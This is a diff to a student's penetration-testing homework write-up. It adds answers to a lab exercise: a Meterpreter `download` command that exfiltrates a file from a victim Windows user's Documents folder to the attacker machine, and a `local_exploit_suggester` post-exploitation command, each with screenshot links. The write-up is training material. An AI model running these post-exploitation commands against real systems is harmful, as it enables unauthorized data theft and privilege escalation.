@@ -137,9 +137,17 @@ Answer: `download 'c:\Users\IEUser\Documents\Drinks.recipe.txt'`
 
 ![Download recipe](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/download%20Drinks.recipe.png)
 
+The file is exfiltrated to the attacker machine's home folder:
+
+![Download recipe 2](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/download%20drinks.recipe%202.PNG)
+
 **You can also use Meterpreter's local exploit suggester to find possible exploits.**
 
 **Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.**
+
+Answer: While still on the victim's machine in meterpreter shell: `run post/multi/recon/local_exploit_suggester`
+
+![local exploit suggester](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/run%20meterpreter%20local%20exploit%20suggester.PNG)
 
 ### Bonus
 **A. Run a Meterpreter post script that enumerates all logged on users.**
